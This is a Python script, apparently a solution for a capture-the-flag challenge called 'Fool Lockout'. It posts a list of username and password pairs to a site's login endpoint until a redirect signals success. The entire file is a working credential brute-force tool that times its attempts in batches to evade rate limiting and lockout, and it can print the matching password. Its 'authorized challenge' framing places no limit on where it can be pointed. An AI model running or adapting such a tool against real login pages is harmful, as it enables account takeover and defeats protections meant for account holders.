#!/usr/bin/env python3
"""Test a supplied credential list against the authorized Fool Lockout challenge."""

import argparse
from pathlib import Path
import sys
import time
from urllib.parse import urljoin, urlparse

import requests


BATCH_SIZE = 10
WAIT_SECONDS = 31
RATE_LIMIT_MARKER = "Rate Limited Exceeded"


def load_credentials(path: Path) -> list[tuple[str, str]]:
    credentials = []
    with path.open(encoding="utf-8") as credential_file:
        for line_number, raw_line in enumerate(credential_file, start=1):
            line = raw_line.strip()
            if not line or line.startswith("#"):
                continue
            try:
                username, password = line.split(";", maxsplit=1)
            except ValueError as error:
                raise ValueError(
                    f"Malformed entry on line {line_number}; expected username;password"
                ) from error
            credentials.append((username, password))
    return credentials


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("url", help="Authorized challenge base URL")
    parser.add_argument("--credentials", type=Path, required=True)
    parser.add_argument(
        "--show-match",
        action="store_true",
        help="Print the matching username and password on success",
    )
    args = parser.parse_args()

    parsed_url = urlparse(args.url)
    if parsed_url.scheme not in {"http", "https"} or not parsed_url.netloc:
        parser.error("url must be an absolute http:// or https:// URL")

    try:
        credentials = load_credentials(args.credentials)
    except (OSError, ValueError) as error:
        print(f"Could not load credentials: {error}", file=sys.stderr)
        return 2
    if not credentials:
        print("Credential file contains no entries.", file=sys.stderr)
        return 2

    login_url = urljoin(args.url.rstrip("/") + "/", "login")
    attempts_in_window = 0

    with requests.Session() as session:
        for position, (username, password) in enumerate(credentials, start=1):
            if attempts_in_window == BATCH_SIZE:
                print(f"Waiting {WAIT_SECONDS}s for the rate counter to reset.")
                time.sleep(WAIT_SECONDS)
                attempts_in_window = 0

            while True:
                try:
                    response = session.post(
                        login_url,
                        data={"username": username, "password": password},
                        allow_redirects=False,
                        timeout=10,
                    )
                except requests.RequestException as error:
                    print(f"Request failed: {error}", file=sys.stderr)
                    return 2

                if RATE_LIMIT_MARKER in response.text:
                    print(f"Rate limited at entry {position}; waiting {WAIT_SECONDS}s.")
                    time.sleep(WAIT_SECONDS)
                    attempts_in_window = 0
                    continue

                if 300 <= response.status_code < 400:
                    print(f"Matching credentials found at entry {position}.")
                    if args.show_match:
                        print(f"{username}:{password}")
                    return 0

                if response.status_code != 200:
                    print(
                        f"Unexpected HTTP status {response.status_code} at entry {position}.",
                        file=sys.stderr,
                    )
                    return 2

                attempts_in_window += 1
                break

            if position % BATCH_SIZE == 0 or position == len(credentials):
                print(f"Checked {position}/{len(credentials)} entries.")

    print("No matching credentials found.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())